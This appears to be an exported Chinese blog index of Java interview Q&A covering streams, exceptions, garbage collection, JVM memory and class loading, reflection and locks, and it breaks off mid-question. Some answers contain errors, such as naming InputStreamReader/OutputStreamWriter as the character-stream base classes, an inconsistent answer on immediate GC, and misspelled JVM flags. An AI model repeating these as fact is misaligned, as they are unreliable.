Serializable只是为了标注该对象是可被序列化的，然后使用一个输出流(如：FileOutputStream)来构造一个 ObjectOutputStream(对象流)对象，接着，使用ObjectOutputStream对象的writeObject(Object obj)方法就可以将参数为obj的对象写出(即保存其状态)，要恢复的话则用输入流。 java中有几种类型的流？JDK为每种类型的流提供了一些抽象类以供继承，请说出他们分别是哪些类？字节流，字符流。字节流继承于InputStream OutputStream，字符流继承于InputStreamReader OutputStreamWriter。在java.io包中还有许多其他的流，主要是为了提高性能和使用方便。 说明一下Java中的异常处理机制的原理以及如何应用。当JAVA 程序违反了JAVA的语义规则时，JAVA虚拟机就会将发生的错误表示为一个异常。违反语义规则包括2种情况。一种是JAVA类库内置的语义检查。例如数组下标越界,会引发IndexOutOfBoundsException;访问null的对象时会引发NullPointerException。另一种情况就是JAVA允许程序员扩展这种语义检查，程序员可以创建自己的异常，并自由选择在何时用throw关键字引发异常。所有的异常都是 java.lang.Thowable的子类。 请问你平时最常见到的runtime exception是什么？12345678910111213141516171819202122232425ArithmeticException,ArrayStoreException,BufferOverflowException,BufferUnderflowException,CannotRedoException,CannotUndoException,ClassCastException,CMMException,ConcurrentModificationException,DOMException,EmptyStackException,IllegalArgumentException,IllegalMonitorStateException,IllegalPathStateException,IllegalStateException,ImagingOpException,IndexOutOfBoundsException,MissingResourceException,NegativeArraySizeException,NoSuchElementException,NullPointerException,ProfileDataException,ProviderException,RasterFormatException, SecurityException, SystemException, UndeclaredThrowableException, UnmodifiableSetException,UnsupportedOperationException error和exception有什么区别?error 表示恢复不是不可能但很困难的情况下的一种严重问题。比如说内存溢出。不可能指望程序能处理这样的情况。exception 表示一种设计或实现问题。也就是说，它表示如果程序运行正常，从不会发生的情况。 运行时的异常与一般情况下出现的异常有什么相同点和不同点？异常表示程序运行过程中可能出现的非正常状态，运行时异常表示虚拟机的通常操作中可能遇到的异常，是一种常见运行错误。java编译器要求方法必须声明抛出可能发生的非运行时异常，但是并不要求必须声明抛出未被捕获的运行时异常。 如何打印日志？cat /var/log/*.log 如果日志在更新，如何实时查看tail -f /var/log/messages 还可以使用watch -d -n 1 cat /var/log/messages -d表示高亮不同的地方，-n表示多少秒刷新一次。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"GC","slug":"GC","date":"2020-07-13T21:38:14.000Z","updated":"2021-04-11T17:11:28.129Z","comments":true,"path":"gc/","link":"","permalink":"https://kayleh.top/gc/","excerpt":"GC","text":"GC 简单描述一下垃圾回收器的基本原理是什么？还有垃圾回收器可以马上回收内存吗？并且有什么办法可以主动通知虚拟机进行垃圾回收呢？ 对于GC来说，当程序员创建对象时，GC就开始监控这个对象的地址、大小以及使用情况。通常，GC采用有向图的方式记录和管理堆(heap)中的所有对象。通过这种方式确定哪些对象是”可达的”，哪些对象是”不可达的”。当GC确定一些对象为”不可达”时，GC就有责任回收这些内存空间。可以。程序员可以手动执行System.gc()，通知GC运行，但是Java语言规范并不保证GC一定会执行。 在java中会存在内存泄漏吗？请简单描述一下。Java中的确存在Java的内存泄漏, 并且事态可以变得相当严重 Java garbage collector自动释放哪些内存里面程序不在需要的对象, 以此避免大多数的其他程序上下文的内存泄漏. 但是Java应用程序依旧会有相当的内存泄漏. 查找原因会十分困难.有两类主要的Java内存泄漏:* 不再需要的对象引用* 未释放的系统资源非必要的对象引用Java代码常常保留对于不再需要的对象引用, 并且这组织了内存的垃圾收集器的工作. Java对象通常被其他对象包含引用, 为此一个单一对象可以保持整个对象树在内存中, 于是导致了如下问题:* 在向数组添加对象以后遗漏了对于他们的处理* 直到你再次使用对象的时候都不释放引用. 比如一个菜单指令可以插件一个对象实例引用并且不释放便于以后再次调用的时候使用, 但是也许永远不会发生.* 在其他引用依然需要旧有状态的时候贸然修改对象状态. 比如当你为了在一个文本文件里面保存一些属性而使用一个数组, 诸如”字符个数”等字段在不再需要的时候依然保留在内存当中.* 允许一个长久执行的线程所引用的对象. 设置引用为NULL也无济于事, 在线程退出和空闲之前, 对象不会被收集释放未释放的系统资源Java方法可以定位Java实例意外的堆内存, 诸如针对视窗和位图的内存资源. Java常常通过JNI(Java Native Interface)调用C/C++子程序定位这些资源. 说明一下垃圾回收的优点以及原理。 Java 语言中一个显著的特点就是引入了垃圾回收机制，使c++程序员最头疼的内存管理的问题迎刃而解，它使得Java程序员在编写程序的时候不再需要考虑内存管理。由于有个垃圾回收机制，Java中的对象不再有”作用域”的概念，只有对象的引用才有”作用域”。垃圾回收可以有效的防止内存泄露，有效的使用可以使用的内存。垃圾回收器通常是作为一个单独的低级别的线程运行，不可预知的情况下对内存堆中已经死亡的或者长时间没有使用的对象进行清楚和回收，程序员不能实时的调用垃圾回收器对某个对象或所有对象进行垃圾回收。回收机制有分代复制垃圾回收和标记垃圾回收，增量垃圾回收。 请问GC是什么? 还有为什么要有GC? GC是垃圾收集的意思（Gabage Collection）,内存处理是编程人员容易出现问题的地方，忘记或者错误的内存回收会导致程序或系统的不稳定甚至崩溃，Java提供的GC功能可以自动监测对象是否超过作用域从而达到自动回收内存的目的，Java语言没有提供释放已分配内存的显示操作方法。 简述一下GC算法①GC（GarbageCollection 垃圾收集），GC的对象是堆空间和永久区 ②GC算法包含：引用计数法，标记清除，标记压缩，复制算法。 ③引用计数器的实现很简单，对于一个对象A，只要有任何一个对象引用了A，则A的引用计数器就加1，当引用失效时，引用计数器就减1。只要对象A的引用计数器的值为0，则对象A就不可能再被使用。 ④标记-清除算法是现代垃圾回收算法的思想基础。标记-清除算法将垃圾回收分为两个阶段：标记阶段和清除阶段。一种可行的实现是，在标记阶段，首先通过根节点，标记所有从根节点开始的可达对象。因此，未被标记的对象就是未被引用的垃圾对象。然后，在清除阶段，清除所有未被标记的对象。与标记-清除算法相比，复制算法是一种相对高效的回收方法不适用于存活对象较多的场合如老年代将原有的内存空间分为两块，每次只使用其中一块，在垃圾回收时，将正在使用的内存中的存活对象复制到未使用的内存块中，之后，清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾回收。 什么原因会导致minor gc运行频繁？同样的，什么原因又会导致minor gc运行很慢？请简要说明一下 可能是堆内存太小。 请问java中内存泄漏是什么意思？什么场景下会出现内存泄漏的情况？ Java中的内存泄露，广义并通俗的说，就是：不再会被使用的对象的内存不能被回收，就是内存泄露。如果长生命周期的对象持有短生命周期的引用，就很可能会出现内存泄露。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"JVM","slug":"JVM","date":"2020-07-13T21:35:08.000Z","updated":"2021-04-11T17:11:28.222Z","comments":true,"path":"jvm/","link":"","permalink":"https://kayleh.top/jvm/","excerpt":"JVM","text":"JVM 简单描述一下JVM加载class文件的原理是什么?JVM中类的装载是由ClassLoader和它的子类来实现的,Java ClassLoader 是一个重要的Java运行时系统组件。它负责在运行时查找和装入类文件的类。 Java中的所有类，都需要由类加载器装载到JVM中才能运行。类加载器本身也是一个类，而它的工作就是把class文件从硬盘读取到内存中。在写程序的时候，我们几乎不需要关心类的加载，因为这些都是隐式装载的，除非我们有特殊的用法，像是反射，就需要显式的加载所需要的类。 类装载方式，有两种（1）隐式装载，程序在运行过程中当碰到通过new 等方式生成对象时，隐式调用类装载器加载对应的类到jvm中，（2）显式装载，通过class.forname()等方法，显式加载需要的类 ,隐式加载与显式加载的区别：两者本质是一样的。 Java类的加载是动态的，它并不会一次性将所有类全部加载后再运行，而是保证程序运行的基础类(像是基类)完全加载到jvm中，至于其他类，则在需要的时候才加载。这当然就是为了节省内存开销。 什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？Java虚拟机是一个可以执行Java字节码的虚拟机进程。Java源文件被编译成能被Java虚拟机执行的字节码文件。Java被设计成允许应用程序可以运行在任意的平台，而不需要程序员为每一个平台单独重写或者是重新编译。Java虚拟机让这个变为可能，因为它知道底层硬件平台的指令长度和其他特性。 jvm最大内存限制多少？(1)堆内存分配 JVM初始分配的内存由-Xms指定，默认是物理内存的1/64；JVM最大分配的内存由-Xmx指定，默认是物理内存的1/4。默认空余堆内存小 于40%时，JVM就会增大堆直到-Xmx的最大限制；空余堆内存大于70%时，JVM会减少堆直到-Xms的最小限制。因此服务器一般设置-Xms、 -Xmx相等以避免在每次GC后调整堆的大小。 (2)非堆内存分配 JVM使用-XX:PermSize设置非堆内存初始值，默认是物理内存的1/64；由XX:MaxPermSize设置最大非堆内存的大小，默认是物理内存的1/4。 (3)VM最大内存 首先JVM内存限制于实际的最大物理内存，假设物理内存无限大的话，JVM内存的最大值跟操作系统有很大的关系。简单的说就32位处理器虽 然可控内存空间有4GB,但是具体的操作系统会给一个限制，这个限制一般是2GB-3GB（一般来说Windows系统下为1.5G-2G，Linux系 统下为2G-3G），而64bit以上的处理器就不会有限制了。 (3)下面是当前比较流行的几个不同公司不同版本JVM最大堆内存: jvm是如何实现线程的？线程是比进程更轻量级的调度执行单位。线程可以把一个进程的资源分配和执行调度分开。一个进程里可以启动多条线程，各个线程可共享该进程的资源(内存地址，文件IO等)，又可以独立调度。线程是CPU调度的基本单位。 主流OS都提供线程实现。Java语言提供对线程操作的同一API，每个已经执行start()，且还未结束的java.lang.Thread类的实例，代表了一个线程。 Thread类的关键方法，都声明为Native。这意味着这个方法无法或没有使用平台无关的手段来实现，也可能是为了执行效率。 实现线程的方式 A.使用内核线程实现内核线程(Kernel-Level Thread, KLT)就是直接由操作系统内核支持的线程。 内核来完成线程切换 内核通过调度器Scheduler调度线程，并将线程的任务映射到各个CPU上 程序使用内核线程的高级接口，轻量级进程(Light Weight Process,LWP) 用户态和内核态切换消耗内核资源 使用用户线程实现 系统内核不能感知线程存在的实现 用户线程的建立、同步、销毁和调度完全在用户态中完成 所有线程操作需要用户程序自己处理，复杂度高 用户线程加轻量级进程混合实现 轻量级进程作为用户线程和内核线程之间的桥梁 什么是JVM内存模型？Java内存模型(简称JMM)，JMM决定一个线程对共享变量的写入何时对另一个线程可见。从抽象的角度来看，JMM定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（main memory）中，每个线程都有一个私有的本地内存（local memory），本地内存中存储了该线程以读/写共享变量的副本。 本地内存是JMM的一个抽象概念，并不真实存在。它涵盖了缓存，写缓冲区，寄存器以及其他的硬件和编译器优化。其关系模型图如下图所示： 在JAVA虚拟机中，哪些对象可作为ROOT对象？虚拟机栈中的引用对象 方法区中类静态属性引用的对象 方法区中常量引用对象 本地方法栈中JNI引用对象 GC中如何判断对象是否需要被回收？即使在可达性分析算法中不可达的对象,也并非是“非回收不可”的,这时候它们暂时处于“等待”阶段,要真正宣告一个对象回收,至少要经历两次标记过程:如果对象在进行可达性分析后发现没有与GC Roots相连接的引用链,那它将会被第一次标记并且进行一次筛选,筛选的条件是此对象是否有必要执行finalize()方法。当对象没有覆盖finalize()方法,或者finalize()方法已经被虚拟机调用过,虚拟机将这两种情况都视为“没有必要执行”。(即意味着直接回收) 如果这个对象被判定为有必要执行finalize()方法,那么这个对象将会放置在一个叫做F-Queue的队列之中,并在稍后由一个由虚拟机自动建立的、低优先级的Finalizer线程去执行它。这里所谓的“执行”是指虚拟机会触发这个方法,但并不承诺会等待它运行结束,这样做的原因是,如果一个对象在finalize()方法中执行缓慢,或者发生了死循环(更极端的情况),将很可能会导致F-Queue队列中其他对象永久处于等待,甚至导致整个内存回收系统崩溃。 finalize()方法是对象逃脱回收的最后一次机会,稍后GC将对F-Queue中的对象进行第二次小规模的标记,如果对象要在finalize()中跳出回收——只要重新与引用链上的任何一个对象建立关联即可,譬如把自己(this关键字)赋值给某个类变量或者对象的成员变量,那在第二次标记时它将被移除出“即将回收”的集合;如果对象这时候还没有逃脱,那基本上它就真的被回收了。 说明一下JAVA虚拟机的作用是什么?解释运行字节码程序消除平台相关性。 jvm将java字节码解释为具体平台的具体指令。一般的高级语言如要在不同的平台上运行，至少需要编译成不同的目标代码。而引入JVM后，Java语言在不同平台上运行时不需要重新编译。Java语言使用模式Java虚拟机屏蔽了与具体平台相关的信息，使得Java语言编译程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。Java虚拟机在执行字节码时，把字节码解释成具体平台上的机器指令执行。 假设一个场景，要求stop the world时间非常短，你会怎么设计垃圾回收机制？ 绝大多数新创建的对象分配在Eden区。 在Eden区发生一次GC后，存活的对象移到其中一个Survivor区。 在Eden区发生一次GC后，对象是存放到Survivor区，这个Survivor区已经存在其他存活的对象。 一旦一个Survivor区已满，存活的对象移动到另外一个Survivor区。然后之前那个空间已满Survivor区将置为空，没有任何数据。 经过重复多次这样的步骤后依旧存活的对象将被移到老年代。 说明一下eden区和survial区的含义以及工作原理？目前主流的虚拟机实现都采用了分代收集的思想，把整个堆区划分为新生代和老年代；新生代又被划分成Eden 空间、 From Survivor 和 To Survivor 三块区域。 我们把Eden : From Survivor : To Survivor 空间大小设成 8 : 1 : 1 ，对象总是在 Eden 区出生， From Survivor 保存当前的幸存对象， To Survivor 为空。一次 gc 发生后： 1）Eden 区活着的对象 ＋ From Survivor 存储的对象被复制到 To Survivor ；2) 清空 Eden 和 From Survivor ； 3) 颠倒 From Survivor 和 To Survivor 的逻辑关系： From 变 To ， To 变 From 。可以看出，只有在 Eden 空间快满的时候才会触发 Minor GC 。而 Eden 空间占新生代的绝大部分，所以 Minor GC 的频率得以降低。当然，使用两个 Survivor 这种方式我们也付出了一定的代价，如 10% 的空间浪费、复制对象的开销等。 简单描述一下JVM分区都有哪些？ java内存通常被划分为5个区域：程序计数器（Program Count Register）、本地方法栈（Native Stack）、方法区（Methon Area）、栈（Stack）、堆（Heap）。 简单描述一下类的加载过程如下图所示，JVM类加载机制分为五个部分：加载，验证，准备，解析，初始化，下面我们就分别来看一下这五个过程。 加载 加载是类加载过程中的一个阶段，这个阶段会在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的入口。注意这里不一定非得要从一个Class文件获取，这里既可以从ZIP包中读取（比如从jar包和war包中读取），也可以在运行时计算生成（动态代理），也可以由其它文件生成（比如将JSP文件转换成对应的Class类）。 验证 这一阶段的主要目的是为了确保Class文件的字节流中包含的信息是否符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。 准备 准备阶段是正式为类变量分配内存并设置类变量的初始值阶段，即在方法区中分配这些变量所使用的内存空间。注意这里所说的初始值概念，比如一个类变量定义为： public static int v = 8080; 实际上变量v在准备阶段过后的初始值为0而不是8080，将v赋值为8080的putstatic指令是程序被编译后，存放于类构造器方法之中，这里我们后面会解释。 但是注意如果声明为： public static final int v = 8080; 在编译阶段会为v生成ConstantValue属性，在准备阶段虚拟机会根据ConstantValue属性将v赋值为8080。 解析 解析阶段是指虚拟机将常量池中的符号引用替换为直接引用的过程。符号引用就是class文件中的： CONSTANT_Class_info CONSTANT_Field_info CONSTANT_Method_info 等类型的常量。 下面我们解释一下符号引用和直接引用的概念： 符号引用与虚拟机实现的布局无关，引用的目标并不一定要已经加载到内存中。各种虚拟机实现的内存布局可以各不相同，但是它们能接受的符号引用必须是一致的，因为符号引用的字面量形式明确定义在Java虚拟机规范的Class文件格式中。 直接引用可以是指向目标的指针，相对偏移量或是一个能间接定位到目标的句柄。如果有了直接引用，那引用的目标必定已经在内存中存在。 初始化 初始化阶段是类加载最后一个阶段，前面的类加载阶段之后，除了在加载阶段可以自定义类加载器以外，其它操作都由JVM主导。到了初始阶段，才开始真正执行类中定义的Java程序代码。 初始化阶段是执行类构造器方法的过程。方法是由编译器自动收集类中的类变量的赋值操作和静态语句块中的语句合并而成的。虚拟机会保证方法执行之前，父类的方法已经执行完毕。p.s: 如果一个类中没有对静态变量赋值也没有静态语句块，那么编译器可以不为这个类生成()方法。 注意以下几种情况不会执行类初始化： 通过子类引用父类的静态字段，只会触发父类的初始化，而不会触发子类的初始化。 定义对象数组，不会触发该类的初始化。 常量在编译期间会存入调用类的常量池中，本质上并没有直接引用定义常量的类，不会触发定义常量所在的类。 通过类名获取Class对象，不会触发类的初始化。 通过Class.forName加载指定类时，如果指定参数initialize为false时，也不会触发类初始化，其实这个参数是告诉虚拟机，是否要对类进行初始化。 通过ClassLoader默认的loadClass方法，也不会触发初始化动作。 类加载器 虚拟机设计团队把加载动作放到JVM外部实现，以便让应用程序决定如何获取所需的类，JVM提供了3种类加载器： 启动类加载器(Bootstrap ClassLoader)：负责加载 JAVA_HOME\\lib 目录中的，或通过-Xbootclasspath参数指定路径中的，且被虚拟机认可（按文件名识别，如rt.jar）的类。 扩展类加载器(Extension ClassLoader)：负责加载 JAVA_HOME\\lib\\ext 目录中的，或通过java.ext.dirs系统变量指定路径中的类库。 应用程序类加载器(Application ClassLoader)：负责加载用户路径（classpath）上的类库。 JVM通过双亲委派模型进行类的加载，当然我们也可以通过继承java.lang.ClassLoader实现自定义的类加载器。 当一个类加载器收到类加载任务，会先交给其父类加载器去完成，因此最终加载任务都会传递到顶层的启动类加载器，只有当父类加载器无法完成加载任务时，才会尝试执行加载任务。采用双亲委派的一个好处是比如加载位于rt.jar包中的类java.lang.Object，不管是哪个加载器加载这个类，最终都是委托给顶层的启动类加载器进行加载，这样就保证了使用不同的类加载器最终得到的都是同样一个Object对象。 简单说明一下JVM的回收算法以及它的回收器是什么？还有CMS采用哪种回收算法？使用CMS怎样解决内存碎片的问题呢？垃圾回收算法 标记清除 标记-清除算法将垃圾回收分为两个阶段：标记阶段和清除阶段。在标记阶段首先通过根节点，标记所有从根节点开始的对象，未被标记的对象就是未被引用的垃圾对象。然后，在清除阶段，清除所有未被标记的对象。标记清除算法带来的一个问题是会存在大量的空间碎片，因为回收后的空间是不连续的，这样给大对象分配内存的时候可能会提前触发full gc。 复制算法 将现有的内存空间分为两快，每次只使用其中一块，在垃圾回收时将正在使用的内存中的存活对象复制到未被使用的内存块中，之后，清除正在使用的内存块中的所有对象，交换两个内存的角色，完成垃圾回收。 现在的商业虚拟机都采用这种收集算法来回收新生代，IBM研究表明新生代中的对象98%是朝夕生死的，所以并不需要按照1:1的比例划分内存空间，而是将内存分为一块较大的Eden空间和两块较小的Survivor空间，每次使用Eden和其中的一块Survivor。当回收时，将Eden和Survivor中还存活着的对象一次性地拷贝到另外一个Survivor空间上，最后清理掉Eden和刚才用过的Survivor的空间。HotSpot虚拟机默认Eden和Survivor的大小比例是8:1(可以通过-SurvivorRattio来配置)，也就是每次新生代中可用内存空间为整个新生代容量的90%，只有10%的内存会被“浪费”。当然，98%的对象可回收只是一般场景下的数据，我们没有办法保证回收都只有不多于10%的对象存活，当Survivor空间不够用时，需要依赖其他内存（这里指老年代）进行分配担保。 标记整理 复制算法的高效性是建立在存活对象少、垃圾对象多的前提下的。这种情况在新生代经常发生，但是在老年代更常见的情况是大部分对象都是存活对象。如果依然使用复制算法，由于存活的对象较多，复制的成本也将很高。 标记-压缩算法是一种老年代的回收算法，它在标记-清除算法的基础上做了一些优化。首先也需要从根节点开始对所有可达对象做一次标记，但之后，它并不简单地清理未标记的对象，而是将所有的存活对象压缩到内存的一端。之后，清理边界外所有的空间。这种方法既避免了碎片的产生，又不需要两块相同的内存空间，因此，其性价比比较高。 增量算法 增量算法的基本思想是，如果一次性将所有的垃圾进行处理，需要造成系统长时间的停顿，那么就可以让垃圾收集线程和应用程序线程交替执行。每次，垃圾收集线程只收集一小片区域的内存空间，接着切换到应用程序线程。依次反复，直到垃圾收集完成。使用这种方式，由于在垃圾回收过程中，间断性地还执行了应用程序代码，所以能减少系统的停顿时间。但是，因为线程切换和上下文转换的消耗，会使得垃圾回收的总体成本上升，造成系统吞吐量的下降。 垃圾回收器 Serial收集器 Serial收集器是最古老的收集器，它的缺点是当Serial收集器想进行垃圾回收的时候，必须暂停用户的所有进程，即stop the world。到现在为止，它依然是虚拟机运行在client模式下的默认新生代收集器，与其他收集器相比，对于限定在单个CPU的运行环境来说，Serial收集器由于没有线程交互的开销，专心做垃圾回收自然可以获得最高的单线程收集效率。 Serial Old是Serial收集器的老年代版本，它同样是一个单线程收集器，使用”标记－整理“算法。这个收集器的主要意义也是被Client模式下的虚拟机使用。在Server模式下，它主要还有两大用途：一个是在JDK1.5及以前的版本中与Parallel Scanvenge收集器搭配使用，另外一个就是作为CMS收集器的后备预案，在并发收集发生Concurrent Mode Failure的时候使用。 通过指定-UseSerialGC参数，使用Serial + Serial Old的串行收集器组合进行内存回收。 ParNew收集器 ParNew收集器是Serial收集器新生代的多线程实现，注意在进行垃圾回收的时候依然会stop the world，只是相比较Serial收集器而言它会运行多条进程进行垃圾回收。 ParNew收集器在单CPU的环境中绝对不会有比Serial收集器更好的效果，甚至由于存在线程交互的开销，该收集器在通过超线程技术实现的两个CPU的环境中都不能百分之百的保证能超越Serial收集器。当然，随着可以使用的CPU的数量增加，它对于GC时系统资源的利用还是很有好处的。它默认开启的收集线程数与CPU的数量相同，在CPU非常多（譬如32个，现在CPU动辄4核加超线程，服务器超过32个逻辑CPU的情况越来越多了）的环境下，可以使用-XX:ParallelGCThreads参数来限制垃圾收集的线程数。 -UseParNewGC: 打开此开关后，使用ParNew + Serial Old的收集器组合进行内存回收，这样新生代使用并行收集器，老年代使用串行收集器。 Parallel Scavenge收集器 Parallel是采用复制算法的多线程新生代垃圾回收器，似乎和ParNew收集器有很多的相似的地方。但是Parallel Scanvenge收集器的一个特点是它所关注的目标是吞吐量(Throughput)。所谓吞吐量就是CPU用于运行用户代码的时间与CPU总消耗时间的比值，即吞吐量=运行用户代码时间 / (运行用户代码时间 + 垃圾收集时间)。停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能够提升用户的体验；而高吞吐量则可以最高效率地利用CPU时间，尽快地完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。 Parallel Old收集器是Parallel Scavenge收集器的老年代版本，采用多线程和”标记－整理”算法。这个收集器是在jdk1.6中才开始提供的，在此之前，新生代的Parallel Scavenge收集器一直处于比较尴尬的状态。原因是如果新生代Parallel Scavenge收集器，那么老年代除了Serial Old(PS MarkSweep)收集器外别无选择。由于单线程的老年代Serial Old收集器在服务端应用性能上的”拖累“，即使使用了Parallel Scavenge收集器也未必能在整体应用上获得吞吐量最大化的效果，又因为老年代收集中无法充分利用服务器多CPU的处理能力，在老年代很大而且硬件比较高级的环境中，这种组合的吞吐量甚至还不一定有ParNew加CMS的组合”给力“。直到Parallel Old收集器出现后，”吞吐量优先“收集器终于有了比较名副其实的应用祝贺，在注重吞吐量及CPU资源敏感的场合，都可以优先考虑Parallel Scavenge加Parallel Old收集器。 -UseParallelGC: 虚拟机运行在Server模式下的默认值，打开此开关后，使用Parallel Scavenge + Serial Old的收集器组合进行内存回收。-UseParallelOldGC: 打开此开关后，使用Parallel Scavenge + Parallel Old的收集器组合进行垃圾回收 CMS收集器 CMS(Concurrent Mark Swep)收集器是一个比较重要的回收器，现在应用非常广泛，我们重点来看一下，CMS一种获取最短回收停顿时间为目标的收集器，这使得它很适合用于和用户交互的业务。从名字(Mark Swep)就可以看出，CMS收集器是基于标记清除算法实现的。它的收集过程分为四个步骤： 初始标记(initial mark) 并发标记(concurrent mark) 重新标记(remark) 并发清除(concurrent sweep) 注意初始标记和重新标记还是会stop the world，但是在耗费时间更长的并发标记和并发清除两个阶段都可以和用户进程同时工作。 G1收集器 G1收集器是一款面向服务端应用的垃圾收集器。HotSpot团队赋予它的使命是在未来替换掉JDK1.5中发布的CMS收集器。与其他GC收集器相比，G1具备如下特点： 并行与并发：G1能更充分的利用CPU，多核环境下的硬件优势来缩短stop the world的停顿时间。 分代收集：和其他收集器一样，分代的概念在G1中依然存在，不过G1不需要其他的垃圾回收器的配合就可以独自管理整个GC堆。 空间整合：G1收集器有利于程序长时间运行，分配大对象时不会无法得到连续的空间而提前触发一次GC。 可预测的非停顿：这是G1相对于CMS的另一大优势，降低停顿时间是G1和CMS共同的关注点，能让使用者明确指定在一个长度为M毫秒的时间片段内，消耗在垃圾收集上的时间不得超过N毫秒。 CMS：采用标记清除算法 解决这个问题的办法就是可以让CMS在进行一定次数的Full GC（标记清除）的时候进行一次标记整理算法，CMS提供了以下参数来控制： -XX:UseCMSCompactAtFullCollection -XX:CMSFullGCBeforeCompaction=5 也就是CMS在进行5次Full GC（标记清除）之后进行一次标记整理算法，从而可以控制老年带的碎片在一定的数量以内，甚至可以配置CMS在每次Full GC的时候都进行内存的整理。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"Reflection","slug":"Reflection","date":"2020-07-13T21:33:21.000Z","updated":"2021-04-11T17:11:28.365Z","comments":true,"path":"reflection/","link":"","permalink":"https://kayleh.top/reflection/","excerpt":"Reflection","text":"Reflection 说明一下JAVA中反射的实现过程和作用分别是什么？JAVA语言编译之后会生成一个.class文件，反射就是通过字节码文件找到某一个类、类中的方法以及属性等。反射的实现主要借助以下四个类： Class：类的对象， Constructor：类的构造方法， Field：类中的属性对象， Method：类中的方法对象。 作用：反射机制指的是程序在运行时能够获取自身的信息。在JAVA中，只要给定类的名字，那么就可以通过反射机制来获取类的所有信息。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"JDK","slug":"JDK","date":"2020-07-13T21:32:29.000Z","updated":"2021-04-11T17:11:28.214Z","comments":true,"path":"jdk/","link":"","permalink":"https://kayleh.top/jdk/","excerpt":"JDK","text":"JDK 请问JDK和JRE的区别是什么？Java运行时环境(JRE)是将要执行Java程序的Java虚拟机。它同时也包含了执行applet需要的浏览器插件。Java开发工具包(JDK)是完整的Java软件开发包，包含了JRE，编译器和其他的工具(比如：JavaDoc，Java调试器)，可以让开发者开发、编译、执行Java应用程序。 Java中的LongAdder和AtomicLong有什么区别？JDK1.8引入了LongAdder类。CAS机制就是，在一个死循环内，不断尝试修改目标值，直到修改成功。如果竞争不激烈，那么修改成功的概率就很高，否则，修改失败的的概率就很高，在大量修改失败时，这些原子操作就会进行多次循环尝试，因此性能就会受到影响。 结合ConcurrentHashMap的实现思想，应该可以想到对一种传统AtomicInteger等原子类的改进思路。虽然CAS操作没有锁，但是像减少粒度这种分离热点的思想依然可以使用。将AtomicInteger的内部核心数据value分离成一个数组，每个线程访问时，通过哈希等算法映射到其中一个数字进行计数，而最终的计数结果，则为这个数组的求和累加。热点数据value被分离成多个单元cell，每个cell独自维护内部的值，当前对象的实际值由所有的cell累计合成，这样热点就进行了有效的分离，提高了并行度。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"Lock","slug":"Lock","date":"2020-07-13T21:31:29.000Z","updated":"2021-04-11T17:11:28.302Z","comments":true,"path":"lock/","link":"","permalink":"https://kayleh.top/lock/","excerpt":"LOCK","text":"LOCK 简述一下synchronized与java.util.concurrent.locks.Lock的相同之处和不同之处？主要相同点：Lock能完成synchronized所实现的所有功能主要不同点：Lock有比synchronized更精确的线程语义和更好的性能。synchronized会自动释放锁，而Lock一定要求程序员手工释放，并且必须在finally从句中释放。 JAVA中如何确保N个线程可以访问N个资源，但同时又不导致死锁？使用多线程的时候，一种非常简单的避免死锁的方式就是： 指定获取锁的顺序，并强制线程按照指定的顺序获取锁。因此，如果所有的线程都是以同样的顺序加锁和释放锁，就不会出现死锁了。 预防死锁，预先破坏产生死锁的四个条件。互斥不可能破坏，所以有如下三种方法： 1.破坏请求和保持条件，进程必须等所有要请求的资源都空闲时才能申请资源，这种方法会使资源浪费严重(有些资源可能仅在运行初期或结束时才使用，甚至根本不使用). 允许进程获取初期所需资源后，便开始运行，运行过程中再逐步释放自己占有的资源，比如有一个进程的任务是把数据复制到磁盘中再打印，前期只需获得磁盘资源而不需要获得打印机资源，待复制完毕后再释放掉磁盘资源。这种方法比第一种方法好，会使资源利用率上升。 2.破坏不可抢占条件，这种方法代价大，实现复杂。 3.破坏循坏等待条件，对各进程请求资源的顺序做一个规定，避免相互等待。这种方法对资源的利用率比前两种都高，但是前期要为设备指定序号，新设备加入会有一个问题，其次对用户编程也有限制。 请问什么是死锁(deadlock)?两个线程或两个以上线程都在等待对方执行完毕才能继续往下执行的时候就发生了死锁。结果就是这些线程都陷入了无限的等待中。 例如，如果线程1锁住了A，然后尝试对B进行加锁，同时线程2已经锁住了B，接着尝试对A进行加锁，这时死锁就发生了。线程1永远得不到B，线程2也永远得不到A，并且它们永远也不会知道发生了这样的事情。为了得到彼此的对象（A和B），它们将永远阻塞下去。这种情况就是一个死锁。 说明一下锁和同步的区别。用法上的不同：synchronized既可以加在方法上，也可以加载特定代码块上，而lock需要显示地指定起始位置和终止位置。synchronized是托管给JVM执行的12，lock的锁定是通过代码实现的，它有比synchronized更精确的线程语义。性能上的不同：lock接口的实现类ReentrantLock，不仅具有和synchronized相同的并发性和内存语义，还多了超时的获取锁、定时锁、等候和中断锁等。在竞争不是很激烈的情况下，synchronized的性能优于ReentrantLock，竞争激烈的情况下synchronized的性能会下降的非常快，而ReentrantLock则基本不变。锁机制不同：synchronized获取锁和释放锁的方式都是在块结构中，当获取多个锁时，必须以相反的顺序释放，并且是自动解锁。而Lock则需要开发人员手动释放，并且必须在finally中释放，否则会引起死锁。 请说明一下synchronized的可重入怎么实现。 每个锁关联一个线程持有者和一个计数器。当计数器为0时表示该锁没有被任何线程持有，那么任何线程都都可能获得该锁而调用相应方法。当一个线程请求成功后，JVM会记下持有锁的线程，并将计数器计为1。此时其他线程请求该锁，则必须等待。而该持有锁的线程如果再次请求这个锁，就可以再次拿到这个锁，同时计数器会递增。当线程退出一个synchronized方法/块时，计数器会递减，如果计数器为0则释放该锁。 请讲一下非公平锁和公平锁在reetrantlock里的实现过程是怎样的。 